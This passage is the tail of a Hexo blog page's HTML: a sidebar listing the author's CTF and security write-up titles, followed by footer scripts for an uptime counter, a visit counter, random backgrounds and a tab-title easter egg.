class="post-list-item"><a class="post-list-link" href="/2020/10/26/ctf-show%201024%E6%9D%AF/">ctf-show 1024杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/">Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/">学习pwn小记(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">对linux 命令执行的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">关于SQL注入小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/">安恒DASCTF 7月赛WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/rgbCTF--wp/">sctf2020 pythonbox题目复现小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/NahamCon%20CTF%20WP/">NahamCon CTF WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">对于文件包含漏洞的知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">如何让文件里PHP代码被服务器解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/">虎符CTF2020--EasyLogin WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python ssti的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/">cocos2d官方文档汉化--Writing a cocos2d application</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+        	                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("01/03/2019 12:39:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2021 lexsd6
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    
+                
+                
+                    <span>| </span>
+                
+                
+                    
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                  
+                
+	
+            
+
+
+
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+
+  </div>
+</body>
+</html>
